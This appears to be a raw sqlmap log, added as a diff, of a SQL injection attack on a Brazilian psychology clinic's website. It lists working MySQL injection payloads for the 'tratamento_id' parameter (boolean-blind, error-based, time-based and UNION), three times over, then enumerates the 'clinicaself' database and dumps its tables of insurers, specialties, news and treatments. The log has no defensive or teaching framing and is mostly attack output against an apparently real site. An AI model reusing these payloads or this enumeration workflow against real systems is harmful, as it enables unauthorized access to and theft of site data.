@@ -1,0 +1,210 @@
+sqlmap identified the following injection point(s) with a total of 205 HTTP(s) requests:
+---
+Parameter: tratamento_id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: pagina=info_tratamento.php&tratamento_id=(SELECT (CASE WHEN (1877=1877) THEN 1 ELSE (SELECT 9819 UNION SELECT 9531) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=info_tratamento.php&tratamento_id=1 AND ROW(1539,1096)>(SELECT COUNT(*),CONCAT(0x717a6b6a71,(SELECT (ELT(1539=1539,1))),0x716b707a71,FLOOR(RAND(0)*2))x FROM (SELECT 7992 UNION SELECT 6625 UNION SELECT 8918 UNION SELECT 5969)a GROUP BY x)
+    Vector: AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=info_tratamento.php&tratamento_id=1 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: pagina=info_tratamento.php&tratamento_id=-3481 UNION ALL SELECT NULL,CONCAT(0x717a6b6a71,0x6543777062697377436f506d7041616c464e5658596b6452786c4f584249666e647561774962524c,0x716b707a71),NULL-- RqlC
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 4.1
+available databases [2]:
+[*] clinicaself
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tratamento_id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: pagina=info_tratamento.php&tratamento_id=(SELECT (CASE WHEN (1877=1877) THEN 1 ELSE (SELECT 9819 UNION SELECT 9531) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=info_tratamento.php&tratamento_id=1 AND ROW(1539,1096)>(SELECT COUNT(*),CONCAT(0x717a6b6a71,(SELECT (ELT(1539=1539,1))),0x716b707a71,FLOOR(RAND(0)*2))x FROM (SELECT 7992 UNION SELECT 6625 UNION SELECT 8918 UNION SELECT 5969)a GROUP BY x)
+    Vector: AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=info_tratamento.php&tratamento_id=1 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: pagina=info_tratamento.php&tratamento_id=-3481 UNION ALL SELECT NULL,CONCAT(0x717a6b6a71,0x6543777062697377436f506d7041616c464e5658596b6452786c4f584249666e647561774962524c,0x716b707a71),NULL-- RqlC
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 4.1
+Database: clinicaself
+[7 tables]
++------------------------------+
+| cf_artigos                   |
+| cf_convenios                 |
+| cf_destaques                 |
+| cf_especialidades            |
+| cf_especialidades_categorias |
+| cf_noticias                  |
+| cf_tratamentos               |
++------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tratamento_id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: pagina=info_tratamento.php&tratamento_id=(SELECT (CASE WHEN (1877=1877) THEN 1 ELSE (SELECT 9819 UNION SELECT 9531) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=info_tratamento.php&tratamento_id=1 AND ROW(1539,1096)>(SELECT COUNT(*),CONCAT(0x717a6b6a71,(SELECT (ELT(1539=1539,1))),0x716b707a71,FLOOR(RAND(0)*2))x FROM (SELECT 7992 UNION SELECT 6625 UNION SELECT 8918 UNION SELECT 5969)a GROUP BY x)
+    Vector: AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=info_tratamento.php&tratamento_id=1 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: pagina=info_tratamento.php&tratamento_id=-3481 UNION ALL SELECT NULL,CONCAT(0x717a6b6a71,0x6543777062697377436f506d7041616c464e5658596b6452786c4f584249666e647561774962524c,0x716b707a71),NULL-- RqlC
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 4.1
+Database: clinicaself
+[7 tables]
++------------------------------+
+| cf_artigos                   |
+| cf_convenios                 |
+| cf_destaques                 |
+| cf_especialidades            |
+| cf_especialidades_categorias |
+| cf_noticias                  |
+| cf_tratamentos               |
++------------------------------+
+
+Database: clinicaself
+Table: cf_artigos
+[0 entries]
++-----------+------+-------+--------+---------+---------+----------+----------+
+| artigo_id | data | texto | titulo | resenha | arquivo | foto_gde | foto_peq |
++-----------+------+-------+--------+---------+---------+----------+----------+
++-----------+------+-------+--------+---------+---------+----------+----------+
+
+Database: clinicaself
+Table: cf_convenios
+[23 entries]
++-------------+---------------------+---------+-------------------------+---------+---------+-----------------------------+-----------------------------+
+| convenio_id | data                | texto   | titulo                  | resenha | arquivo | foto_gde                    | foto_peq                    |
++-------------+---------------------+---------+-------------------------+---------+---------+-----------------------------+-----------------------------+
+| 2           | 2008-11-13 10:32:11 | <blank> | Porto Seguro            | <blank> | <blank> | gde_2_porto_seguro.jpg      | peq_2_porto_seguro.jpg      |
+| 4           | 2008-11-13 10:31:35 | <blank> | SABESPREV               | <blank> | <blank> | gde_1_sabespprev.jpg        | peq_1_sabespprev.jpg        |
+| 5           | 2008-11-12 14:51:03 | <blank> | Santa Malia             | <blank> | <blank> | gde_santamalia.jpg          | peq_santamalia.jpg          |
+| 6           | 2008-11-13 10:31:04 | <blank> | Sindicato ABC           | <blank> | <blank> | gde_1_sindabc.jpg           | peq_1_sindabc.jpg           |
+| 7           | 2008-11-12 14:51:47 | <blank> | Transzero               | <blank> | <blank> | gde_transzero.jpg           | peq_transzero.jpg           |
+| 8           | 2008-11-12 14:52:13 | <blank> | Unimed ABC              | <blank> | <blank> | gde_unimed.jpg              | peq_unimed.jpg              |
+| 9           | 2011-09-30 09:08:00 | <blank> | Tempo SaÃºde            | <blank> | <blank> | gde_tempo_saude.jpg         | peq_tempo_saude.jpg         |
+| 29          | 2015-09-25 16:43:42 | <blank> | Caixa Seguros           | <blank> | <blank> | gde_Caixa-Seguro-Saude-.jpg | peq_Caixa-Seguro-Saude-.jpg |
+| 10          | 2009-01-26 11:04:08 | <blank> | Cassi                   | <blank> | <blank> | gde_cassi.jpg               | peq_cassi.jpg               |
+| 11          | 2009-01-26 11:09:11 | <blank> | Gama                    | <blank> | <blank> | gde_logo_gama.jpg           | peq_logo_gama.jpg           |
+| 13          | 2009-01-26 11:10:42 | <blank> | Nipomed                 | <blank> | <blank> | gde_nipomed.jpg             | peq_nipomed.jpg             |
+| 14          | 2012-10-25 16:10:24 | <blank> | FundaÃ§Ã£o SaÃºde ItaÃº | <blank> | <blank> | gde_itau[1].jpg             | peq_itau[1].jpg             |
+| 15          | 2009-02-11 14:23:22 | <blank> | Mediservice             | <blank> | <blank> | gde_logo_mediservice.jpg    | peq_logo_mediservice.jpg    |
+| 16          | 2009-02-11 14:23:31 | <blank> | MarÃ­tima               | <blank> | <blank> | gde_maritima.jpg            | peq_maritima.jpg            |
+| 18          | 2009-08-17 09:52:01 | <blank> | CAASP                   | <blank> | <blank> | gde_1_caasp.jpg             | peq_1_caasp.jpg             |
+| 19          | 2012-10-26 14:38:20 | <blank> | Aldeias Infantis SOS    | <blank> | <blank> | gde_1_aldeias.jpg           | peq_1_aldeias.jpg           |
+| 27          | 2015-08-18 11:12:45 | <blank> | Mapfre                  | <blank> | <blank> | gde_MAPFRE.jpg              | peq_MAPFRE.jpg              |
+| 21          | 2011-09-30 08:45:51 | <blank> | Bradesco SaÃºde         | <blank> | <blank> | gde_brad_1.jpg              | peq_brad_1.jpg              |
+| 28          | 2015-08-18 11:13:05 | <blank> | Volkswagen              | <blank> | <blank> | gde_logotipo-volkswagen.jpg | peq_logotipo-volkswagen.jpg |
+| 24          | 2011-09-30 09:06:47 | <blank> | Infraero Aeroportos     | <blank> | <blank> | gde_infra.jpg               | peq_infra.jpg               |
+| 25          | 2012-10-09 10:29:56 | <blank> | NotreDame               | <blank> | <blank> | gde_clip_image001.jpg       | peq_clip_image001.jpg       |
+| 26          | 2012-10-25 16:09:25 | <blank> | Serpro                  | <blank> | <blank> | gde_logo[1].png             | peq_logo[1].png             |
+| 30          | 2015-11-16 11:43:33 | <blank> | Postal                  | <blank> | <blank> | gde_LOGO_POSTAL.jpg         | peq_LOGO_POSTAL.jpg         |
++-------------+---------------------+---------+-------------------------+---------+---------+-----------------------------+-----------------------------+
+
+Database: clinicaself
+Table: cf_destaques
+[1 entry]
++-------------+---------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------------------------------------------------------------------------+-----------------------+-----------------------+
+| destaque_id | data                | texto                                                                                                                                                   | titulo              | resenha                                                                        | foto_gde              | foto_peq              |
++-------------+---------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------------------------------------------------------------------------+-----------------------+-----------------------+
+| 1           | 2008-11-13 11:01:25 | texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto v | TÃ­tulo do destaque | texto texto texto texto texto texto texto texto texto texto texto texto texto  | gde_foto_destaque.jpg | peq_foto_destaque.jpg |
++-------------+---------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------------------------------------------------------------------------------+-----------------------+-----------------------+
+
+Database: clinicaself
+Table: cf_especialidades
+[10 entries]
++--------------+------------------+---------+------------------------------+
+| categoria_id | especialidade_id | texto   | titulo                       |
++--------------+------------------+---------+------------------------------+
+| 1            | 1                | <blank> | PsicodiagnÃ³stico            |
+| 1            | 2                | <blank> | Psicoterapia                 |
+| 1            | 3                | <blank> | Ludoterapia                  |
+| 1            | 4                | <blank> | OrientaÃ§Ã£o Ã  pais         |
+| 1            | 5                | <blank> | OrientaÃ§Ã£o Familiar        |
+| 1            | 6                | <blank> | OrientaÃ§Ã£o Vocacional      |
+| 1            | 7                | <blank> | Psicomotricidade             |
+| 1            | 8                | <blank> | Psicopedagogia               |
+| 2            | 9                | <blank> | AvaliaÃ§Ã£o fonoaudiolÃ³gica |
+| 2            | 10               | <blank> | Fonoterapia                  |
++--------------+------------------+---------+------------------------------+
+
+Database: clinicaself
+Table: cf_especialidades_categorias
+[2 entries]
++--------------+----------------+
+| categoria_id | categoria_nome |
++--------------+----------------+
+| 1            | Psicologia     |
+| 2            | Fonoaudiologia |
++--------------+----------------+
+
+Database: clinicaself
+Table: cf_noticias
+[3 entries]
++------------+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------+-----------------------------------------------------------------------------+---------+----------+----------+
+| noticia_id | data                | texto                                                                                                                                                        | titulo                                               | resenha                                                                     | arquivo | foto_gde | foto_peq |
++------------+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------+-----------------------------------------------------------------------------+---------+----------+----------+
+| 7          | 2008-11-13 09:15:23 | texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto v                        | IBGE: 18,5% usam planos privados de saÃºde no paÃ­s  | IBGE: 18,5% usam planos privados de saÃºde no paÃ­s                         | <blank> | <blank>  | <blank>  |
+| 5          | 2008-11-13 09:14:55 | texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto                                      | Procon-SP pede padronizaÃ§Ã£o dos planos de saÃºde   | Procon-SP pede padronizaÃ§Ã£o dos planos de saÃºde                          | <blank> | <blank>  | <blank>  |
+| 6          | 2008-11-13 09:15:10 | texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto texto  | Carazzai, novo presidente da Medial: "NÃ£o hÃ¡ conve | Carazzai, novo presidente da Medial: "NÃ£o hÃ¡ conversa entre Amil e Medial | <blank> | <blank>  | <blank>  |
++------------+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------+-----------------------------------------------------------------------------+---------+----------+----------+
+
+Database: clinicaself
+Table: cf_tratamentos
+[12 entries]
++---------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------+
+| tratamento_id | texto                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | titulo                    |
++---------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------+
+| 1             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | DepressÃ£o                |
+| 2             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Ansiedade                 |
+| 3             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Fobia                     |
+| 4             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Stress                    |
+| 5             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | InsÃ´nia                  |
+| 6             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Gagueira                  |
+| 7             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | DependÃªncia QuÃ­mica     |
+| 8             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Problemas de Aprendizagem |
+| 9             | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Jogos PatolÃ³gicos        |
+| 10            | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | DistÃºrbios Sexuais       |
+| 11            | Os transtornos alimentares constituem uma epidemia que assola a sociedade, acometendo sobretudo adolescentes e adultos jovens. O pensamento falho e doentio das pessoas portadoras dessas patologias se caracteriza por uma obsessÃ£o pela perfeiÃ§Ã£o do corpo. Esta obsessÃ£o tem vÃ¡rias formas de se manifestar. As mais tradicionais sÃ£o: a Anorexia, a Bulimia Nervosa e a CompulsÃ£o Alimentar.\r\nApesar da gravidade, os comportamentos de risco que alertam para os sintomas dessas doenÃ§as costumam passar desapercebidos porque sÃ£o aceitos pela sociedade, o que inibe o tratamento adequado.\r\n<b>Anorexia Nervosa</b> Ã© um transtorno emocional que consiste em perda de apetite alimentar e consequentemente de peso, que Ã© derivada pelo intenso temor da obesidade.\r\n<b>Bulimia Nervosa</b> Ã© um transtorno mental que se caracteriza por episÃ³dios de ingestÃ£o excessiva de alimentos num curto espaÃ§o de tempo, que posteriormente, para nÃ£o engordar, leva a pessoa a adotar condutas inadequadas e perigosas para a saÃºde.\r\nNa <b>CompulsÃ£o Alimentar</b> os pacientes apresentam episÃ³dios de voracidade fÃ¡gica, mas sem se utilizar de mÃ©todos purgativos. Apesar de se sentirem culpados e envergonhados por sua falta de controle, eles nÃ£o apresentam atitudes compensatÃ³rias e radicais. Invariavelmente tem um histÃ³rico de fracassos em dietas e normalmente sÃ£o pessoas depressivas e obesas. | Transtornos Alimentares   |
+| 12            | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Outros                    |
++---------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------+
+
